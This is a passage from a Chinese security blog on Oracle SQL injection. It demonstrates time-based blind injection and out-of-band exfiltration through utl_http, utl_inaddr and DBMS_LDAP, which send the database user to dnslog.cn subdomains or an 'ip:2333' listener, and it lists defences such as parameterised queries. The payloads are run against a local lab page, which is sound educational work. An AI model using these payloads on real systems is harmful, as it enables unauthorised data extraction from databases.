<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle.php?id&#x3D;IT_PROG&#39; and 1&#x3D;(select decode(substr(user,1,1),&#39;S&#39;,dbms_pipe.receive_message(&#39;RDS&#39;,5),0) from dual)--</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210104143500771.png" alt="image-20210104143500771"></p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210104143529219.png" alt="image-20210104143529219"></p>
<p>得到用户名SYSTEM</p>
<p>还有其他方式延时注入，如select count(*) from all_objects，大量统计操作很耗时，可以辅助延时注入，但是延长时间不好控制。</p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210104143727090.png" alt="image-20210104143727090"></p>
<h1 id="带外注入"><a href="#带外注入" class="headerlink" title="带外注入"></a>带外注入</h1><h2 id="方法一：utl-http-request"><a href="#方法一：utl-http-request" class="headerlink" title="方法一：utl_http.request()"></a>方法一：utl_http.request()</h2><p>select utl_http.request(“<a target="_blank" rel="noopener" href="http://www.baidu.com&quot;/">www.baidu.com&quot;</a>) from dual;</p>
<p>eg：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select utl_http.request((select user from dual)||&#39;.ljc08k.dnslog.cn&#39;) from dual;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210105152132436.png" alt="image-20210105152132436"></p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210105152206125.png" alt="image-20210105152206125"></p>
<h2 id="方法二：utl-inaddr-get-host-address"><a href="#方法二：utl-inaddr-get-host-address" class="headerlink" title="方法二：utl_inaddr.get_host_address()"></a>方法二：utl_inaddr.get_host_address()</h2><p>select utl_inaddr.get_host_address(‘<a target="_blank" rel="noopener" href="http://www.baidu.com&/#39;">www.baidu.com&#39;</a>) from dual;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select utl_inaddr.get_host_address((select user from dual)||&#39;.m8146s.dnslog.cn&#39;) from dual;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210105152310252.png" alt="image-20210105152310252"></p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210105152350116.png" alt="image-20210105152350116"></p>
<h2 id="方法三：DBMS-LDAP-INIT"><a href="#方法三：DBMS-LDAP-INIT" class="headerlink" title="方法三：DBMS_LDAP.INIT()"></a>方法三：DBMS_LDAP.INIT()</h2><p>select SYS.DBMS_LDAP.INIT((select user from dual)||’.aaaa.com’,80) from dual</p>
<p>注意第二个参数不能丢，否则报错如下：</p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210105150902730.png" alt="image-20210105150902730"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ORA-06553: PLS-306: wrong number or types of arguments in call to &#39;INIT&#39;</span><br></pre></td></tr></table></figure>
<p>eg:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DBMS_LDAP.INIT(&#39;uka9e0.dnslog.cn&#39;,80) FROM DUAL;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210105150120452.png" alt="image-20210105150120452"></p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210105150452571.png" alt="image-20210105150452571"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select DBMS_LDAP.INIT((select user from dual)||&#39;.uka9e0.dnslog.cn&#39;,80) from dual</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210105150508554.png" alt="image-20210105150508554"></p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210105150545179.png" alt="image-20210105150545179"></p>
<h2 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h2><h3 id="utl-http-request"><a href="#utl-http-request" class="headerlink" title="utl_http.request()"></a>utl_http.request()</h3><p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and utl_http.request(&#39;http:&#x2F;&#x2F;ip:2333&#x2F;&#39;||(SELECT user FROM dual))&#x3D;1 --</span><br></pre></td></tr></table></figure>
<p>基本上每次都要60秒才回显到web，但是发送请求的那一刻，服务器就会收到消息。</p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210105173852589.png" alt="image-20210105173852589"></p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210105171147816.png" alt="image-20210105171147816"></p>
<p>web视图如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle.php?id&#x3D;IT_PROG&#39; and utl_http.request(&#39;http:&#x2F;&#x2F;ip:2333&#x2F;&#39;||(SELECT user FROM dual))&#x3D;1 --&#39;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210105173102629.png" alt="image-20210105173102629"></p>
<h3 id="utl-inaddr-get-host-address"><a href="#utl-inaddr-get-host-address" class="headerlink" title="utl_inaddr.get_host_address()"></a>utl_inaddr.get_host_address()</h3><p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and utl_inaddr.get_host_address((select user from dual)||&#39;.29qo74.dnslog.cn&#39;)&#x3D;&#39;1&#39; --</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210105174550521.png" alt="image-20210105174550521"></p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210105174601204.png" alt="image-20210105174601204"></p>
<p>web视图：</p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210105174951685.png" alt="image-20210105174951685"></p>
<h3 id="DBMS-LDAP-INIT"><a href="#DBMS-LDAP-INIT" class="headerlink" title="DBMS_LDAP.INIT()"></a>DBMS_LDAP.INIT()</h3><p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and DBMS_LDAP.INIT((select user from dual)||&#39;.113bm3.dnslog.cn&#39;,80)&#x3D;&#39;1&#39;--</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210105174038638.png" alt="image-20210105174038638"></p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210105174137608.png" alt="image-20210105174137608"></p>
<p>web视图：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oracle.php?id&#x3D;IT_PROG&#39; and DBMS_LDAP.INIT((select user from dual)||&#39;.113bm3.dnslog.cn&#39;,80)&#x3D;&#39;1&#39;--</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210105174212382.png" alt="image-20210105174212382"></p>
<p>报错未解决如下：有可能是数据库没有这几个函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: oci_execute(): ORA-00920: invalid relational operator</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210105151625565.png" alt="image-20210105151625565"></p>
<h1 id="Oracle注入防御"><a href="#Oracle注入防御" class="headerlink" title="Oracle注入防御"></a><strong>Oracle注入防御</strong></h1><p>1、代码层防御技术</p>
<p>使用参数化查询语句、验证输入、规范化等技术，如JAVA中使用JDBC框架，C#使用ADO.NAT框架，PHP使用PDO架构等。Oracle PL/SQL 在数据库代码层也可以使用参数化方式去查询，它使用带有编号的冒号字符去绑定参数来达到防注入的目的[5][6]。</p>
<p>2、输入验证</p>
<p>任何输入的数据均是不可信的，可以对不可信数据进行验证，如使用黑白名单过滤等。在JAVA中可以使用定义一个输入验证类，实现javax.faces.validator.Validator接口，对用户输入进行验证。C#可以使用某些具有验证功能的控件对用户输入进行验证。PHP中可以使用正则表达式验证用户输入，或者使用特定功能函数判断输入是否合法。</p>
<p>3、输出编码</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1672145">https://cloud.tencent.com/developer/article/1672145</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7897">https://xz.aliyun.com/t/7897</a></p>
<p><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2019/04/16/Oracle%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/index.html">https://www.tr0y.wang/2019/04/16/Oracle%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/index.html</a></p>
</blockquote>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2020-12-27T06:52:11.000Z" title="2020-12-27 14:52:11">2020-12-27</time>发表</span><span class="level-item"><time dateTime="2021-02-23T06:12:07.931Z" title="2021-2-23 14:12:07">2021-02-23</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></span><span class="level-item">17 分钟读完 (大约2589个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/12/27/%E9%A2%84%E7%BC%96%E8%AF%91%E9%98%B2%E6%AD%A2%E7%99%BE%E5%88%86%E4%B9%8B95%E7%9A%84SQL%E6%B3%A8%E5%85%A5/">预编译防止百分之95的SQL注入</a></h1><div class="content"><h1 id="数据库预编译起源"><a href="#数据库预编译起源" class="headerlink" title="数据库预编译起源"></a>数据库预编译起源</h1><p>（1）数据库SQL语句编译特性：<br> 数据库接受到sql语句之后，需要词法和语义解析，优化sql语句，制定执行计划。这需要花费一些时间。但是很多情况，我们的一条sql语句可能会反复执行，或者<code>每次执行的时候只有个别的值不同</code>（比如query的where子句值不同，update的set子句值不同,insert的values值不同）。<br> （2）减少编译的方法<br> 如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就明显不行了。为了解决上面的问题，于是就有了预编译，预编译语句就是将这类语句中的<code>值用占位符替代</code>，可以视为将<code>sql语句模板化或者说参数化</code>。一次编译、多次运行，省去了解析优化等过程。<br> （3）缓存预编译<br> 预编译语句被DB的编译器编译后的执行代码被缓存下来,那么下次调用时只要是相同的预编译语句就不需要编译,只要将参数直接传入编译过的语句执行代码中(相当于一个涵数)就会得到执行。<br> <code>并不是所以预编译语句都一定会被缓存</code>,数据库本身会用一种策略（内部机制）。<br> (4) 预编译的实现方法<br> 预编译是通过PreparedStatement和占位符来实现的。</p></div><a class="article-more button is-small is-size-7" href="/2020/12/27/%E9%A2%84%E7%BC%96%E8%AF%91%E9%98%B2%E6%AD%A2%E7%99%BE%E5%88%86%E4%B9%8B95%E7%9A%84SQL%E6%B3%A8%E5%85%A5/#more">阅读更多</a></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2020-10-07T07:21:19.000Z" title="2020-10-7 15:21:19">2020-10-07</time>发表</span><span class="level-item"><time dateTime="2021-02-23T06:30:46.876Z" title="2021-2-23 14:30:46">2021-02-23</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/web%E6%B8%97%E9%80%8F/">web渗透</a></span><span class="level-item">5 分钟读完 (大约801个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/10/07/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B/"> </a></h1><div class="content"><h2 id="判断MySQL数据库"><a href="#判断MySQL数据库" class="headerlink" title="判断MySQL数据库"></a><strong>判断MySQL数据库</strong></h2><p><strong>1.通过报错信息</strong></p>
<blockquote>
<p>you have an error in your SQL syntax,check the manual that corrsponds to your mysql server version for the tifht syntax to use near ” at line x</p>
</blockquote></div><a class="article-more button is-small is-size-7" href="/2020/10/07/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B/#more">阅读更多</a></article></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/avatar.png" alt="B0urne"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">B0urne</p><p class="is-size-6 is-block">渗透测试/WEB安全</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>BeiJing</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">80</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">21</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">37</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ppoffice" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ppoffice"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="http://www.ol4three.com" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">oldthree</span></span><span class="level-right"><span class="level-item tag">www.ol4three.com</span></span></a></li><li><a class="level is-mobile" href="http://blog.leanote.com/xcniao@foxmail.com" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">XCniao</span></span><span class="level-right"><span class="level-item tag">blog.leanote.com</span></span></a></li></ul></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/Android/"><span class="level-start"><span class="level-item">Android</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/Mac/"><span class="level-start"><span class="level-item">Mac</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/SQL%E6%B3%A8%E5%85%A5/"><span class="level-start"><span class="level-item">SQL注入</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/SpringBoot/"><span class="level-start"><span class="level-item">SpringBoot</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/XSS/"><span class="level-start"><span class="level-item">XSS</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/hexo/"><span class="level-start"><span class="level-item">hexo</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/linux/"><span class="level-start"><span class="level-item">linux</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/python/"><span class="level-start"><span class="level-item">python</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/web%E6%B8%97%E9%80%8F/"><span class="level-start"><span class="level-item">web渗透</span></span><span class="level-end"><span class="level-item tag">21</span></span></a></li><li><a class="level is-mobile" href="/categories/windows/"><span class="level-start"><span class="level-item">windows</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E4%BA%BA%E7%94%9F%E6%84%9F%E6%82%9F/"><span class="level-start"><span class="level-item">人生感悟</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%BF%9B%E9%98%B6/"><span class="level-start"><span class="level-item">博客搭建进阶</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%8F%90%E6%9D%83/"><span class="level-start"><span class="level-item">提权</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><span class="level-start"><span class="level-item">文件上传</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8E%9F%E7%90%86/"><span class="level-start"><span class="level-item">服务器原理</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="level-start"><span class="level-item">渗透测试</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/recurrent/"><span class="level-start"><span class="level-item">漏洞复现</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"><span class="level-start"><span class="level-item">漏洞挖掘</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E7%BB%95%E8%BF%87/"><span class="level-start"><span class="level-item">绕过</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/"><span class="level-start"><span class="level-item">问题汇总</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E9%9D%A2%E8%AF%95/"><span class="level-start"><span class="level-item">面试</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-03-16T08:46:08.000Z">2021-03-16</time></p><p class="title"><a href="/2021/03/16/OpenSSH%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE-CVE-2018-15473/">OpenSSH用户名枚举_CVE-2018-15473</a></p><p class="categories"><a href="/categories/web%E6%B8%97%E9%80%8F/">web渗透</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-02-01T07:39:36.000Z">2021-02-01</time></p><p class="title"><a href="/2021/02/01/CVE-2021-3156-Sudo%E6%8F%90%E6%9D%83/">CVE-2021-3156 Sudo提权</a></p><p class="categories"><a href="/categories/%E6%8F%90%E6%9D%83/">提权</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-01-29T05:24:31.000Z">2021-01-29</time></p><p class="title"><a href="/2021/01/29/Selenium%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">Selenium使用教程</a></p><p class="categories"><a href="/categories/web%E6%B8%97%E9%80%8F/">web渗透</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-01-29T04:22:09.000Z">2021-01-29</time></p><p class="title"><a href="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/">FckEditor编辑器上传漏洞getshel总结</a></p><p class="categories"><a href="/categories/web%E6%B8%97%E9%80%8F/">web渗透</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-01-25T09:50:55.000Z">2021-01-25</time></p><p class="title"><a href="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/">JumpServer 远程命令执行-2021</a></p><p class="categories"><a href="/categories/web%E6%B8%97%E9%80%8F/">web渗透</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">二月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">一月 2021</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/12/"><span class="level-start"><span class="level-item">十二月 2020</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/10/"><span class="level-start"><span class="level-item">十月 2020</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/09/"><span class="level-start"><span class="level-item">九月 2020</span></span><span class="level-end"><span class="level-item tag">20</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/08/"><span class="level-start"><span class="level-item">八月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/07/"><span class="level-start"><span class="level-item">七月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/05/"><span class="level-start"><span class="level-item">五月 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/03/"><span class="level-start"><span class="level-item">三月 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/02/"><span class="level-start"><span class="level-item">二月 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/01/"><span class="level-start"><span class="level-item">一月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/11/"><span class="level-start"><span class="level-item">十一月 2019</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/10/"><span class="level-start"><span class="level-item">十月 2019</span></span><span class="level-end"><span class="level-item tag">16</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/08/"><span class="level-start"><span class="level-item">八月 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/0day/"><span class="tag">0day</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Android/"><span class="tag">Android</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CVE/"><span class="tag">CVE</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Hexo/"><span class="tag">Hexo</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/JAVA/"><span class="tag">JAVA</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Mac/"><span class="tag">Mac</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PHP/"><span class="tag">PHP</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RCE/"><span class="tag">RCE</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Redis/"><span class="tag">Redis</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SQL%E6%B3%A8%E5%85%A5/"><span class="tag">SQL注入</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/SpringBoot/"><span class="tag">SpringBoot</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ThinkCMF/"><span class="tag">ThinkCMF</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/XSS/"><span class="tag">XSS</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/hexo/"><span class="tag">hexo</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/linux/"><span class="tag">linux</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/mimikatz/"><span class="tag">mimikatz</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/python/"><span class="tag">python</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/redis/"><span class="tag">redis</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ssrf/"><span class="tag">ssrf</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/web%E6%B8%97%E9%80%8F/"><span class="tag">web渗透</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/windows/"><span class="tag">windows</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/xposed/"><span class="tag">xposed</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E4%BA%BA%E7%94%9F%E6%84%9F%E6%82%9F/"><span class="tag">人生感悟</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%85%8D%E6%9D%80/"><span class="tag">免杀</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="tag">反序列化</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%90%8E%E9%97%A8/"><span class="tag">后门</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%AD%90%E7%B3%BB%E7%BB%9F/"><span class="tag">子系统</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%8F%90%E6%9D%83/"><span class="tag">提权</span><span class="tag">8</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><span class="tag">文件上传</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8E%9F%E7%90%86/"><span class="tag">服务器原理</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"><span class="tag">未授权访问</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%B3%9B%E5%BE%AEOA/"><span class="tag">泛微OA</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%B8%97%E9%80%8F/"><span class="tag">渗透</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%A0%B4%E8%A7%A3/"><span class="tag">破解</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%BB%95waf/"><span class="tag">绕waf</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E9%9D%A2%E8%AF%95/"><span class="tag">面试</span><span class="tag">1</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><div class="card widget" data-type="adsense"><div class="card-content"><div class="menu"><h3 class="menu-label">广告</h3><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><ins class="adsbygoogle" style="display:block" data-ad-client="11" data-ad-slot="11" data-ad-format="auto" data-full-width-responsive="true"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo2.png" alt="B0urne &#039;s Blog" height="28"></a><p class="is-size-7"><span>&copy; 2021 B0urne</span>  Powered by <a 